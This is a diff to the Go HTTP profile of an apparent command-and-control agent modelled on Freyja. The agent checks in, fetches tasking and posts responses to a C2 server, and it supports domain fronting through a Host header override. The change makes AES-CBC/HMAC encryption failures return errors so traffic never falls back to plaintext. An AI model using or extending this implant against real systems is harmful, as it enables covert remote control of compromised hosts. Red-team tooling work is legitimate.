@@ -34,7 +34,7 @@ type HTTPProfile struct {
 	Debug         bool
 	GetEndpoint   string
 	PostEndpoint  string
-	HostHeader    string // Override Host header for domain fronting
+	HostHeader    string            // Override Host header for domain fronting
 	CustomHeaders map[string]string // Additional HTTP headers from C2 profile
 	client        *http.Client
 	CallbackUUID  string // Store callback UUID from initial checkin
@@ -156,7 +156,10 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 
 	// Encrypt if encryption key is provided
 	if h.EncryptionKey != "" {
-		body = h.encryptMessage(body)
+		body, err = h.encryptMessage(body)
+		if err != nil {
+			return fmt.Errorf("encryption failed: %w", err)
+		}
 	}
 
 	// Send using Freyja-style format: UUID + JSON, then base64 encode
@@ -262,7 +265,10 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.S
 
 	// Encrypt if encryption key is provided
 	if h.EncryptionKey != "" {
-		body = h.encryptMessage(body)
+		body, err = h.encryptMessage(body)
+		if err != nil {
+			return nil, nil, fmt.Errorf("encryption failed: %w", err)
+		}
 	}
 
 	// Send using Freyja-style format: UUID + JSON, then base64 encode
@@ -517,9 +523,9 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 
 	// Encrypt if encryption key is provided
 	if h.EncryptionKey != "" {
-		body = h.encryptMessage(body)
-		if h.Debug {
-			// log.Printf("[DEBUG] Response message encrypted")
+		body, err = h.encryptMessage(body)
+		if err != nil {
+			return nil, fmt.Errorf("encryption failed: %w", err)
 		}
 	}
 
@@ -668,65 +674,45 @@ func getString(m map[string]interface{}, key string) string {
 	return ""
 }
 
-// encryptMessage encrypts a message exactly like Freyja's AesEncrypt
-func (h *HTTPProfile) encryptMessage(msg []byte) []byte {
+// encryptMessage encrypts a message exactly like Freyja's AesEncrypt.
+// Returns an error if encryption fails — never falls back to plaintext to avoid leaking unencrypted data.
+func (h *HTTPProfile) encryptMessage(msg []byte) ([]byte, error) {
 	if h.EncryptionKey == "" {
-		return msg
+		return msg, nil
 	}
 
-	// Decode the base64 key
 	key, err := base64.StdEncoding.DecodeString(h.EncryptionKey)
 	if err != nil {
-		if h.Debug {
-			// log.Printf("[DEBUG] Failed to decode encryption key: %v", err)
-		}
-		return msg
+		return nil, fmt.Errorf("failed to decode encryption key: %w", err)
 	}
 
-	// Create AES cipher
 	block, err := aes.NewCipher(key)
 	if err != nil {
-		if h.Debug {
-			// log.Printf("[DEBUG] Failed to create AES cipher: %v", err)
-		}
-		return msg
+		return nil, fmt.Errorf("failed to create AES cipher: %w", err)
 	}
 
-	// Generate random IV
 	iv := make([]byte, aes.BlockSize)
 	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
-		if h.Debug {
-			// log.Printf("[DEBUG] Failed to generate IV: %v", err)
-		}
-		return msg
+		return nil, fmt.Errorf("failed to generate IV: %w", err)
 	}
 
-	// Create CBC encrypter
 	mode := cipher.NewCBCEncrypter(block, iv)
 
-	// Pad the message to block size
 	padded, err := pkcs7Pad(msg, aes.BlockSize)
 	if err != nil {
-		if h.Debug {
-			// log.Printf("[DEBUG] Failed to pad message: %v", err)
-		}
-		return msg
+		return nil, fmt.Errorf("failed to pad message: %w", err)
 	}
 
-	// Encrypt the message
 	encrypted := make([]byte, len(padded))
 	mode.CryptBlocks(encrypted, padded)
 
-	// Freyja format: IV + Ciphertext
 	ivCiphertext := append(iv, encrypted...)
 
-	// Create HMAC of IV + Ciphertext
 	hmacHash := hmac.New(sha256.New, key)
 	hmacHash.Write(ivCiphertext)
 	hmacBytes := hmacHash.Sum(nil)
 
-	// Freyja format: IV + Ciphertext + HMAC
-	return append(ivCiphertext, hmacBytes...)
+	return append(ivCiphertext, hmacBytes...), nil
 }
 
 // pkcs7Pad adds PKCS#7 padding (matching Freyja's implementation)
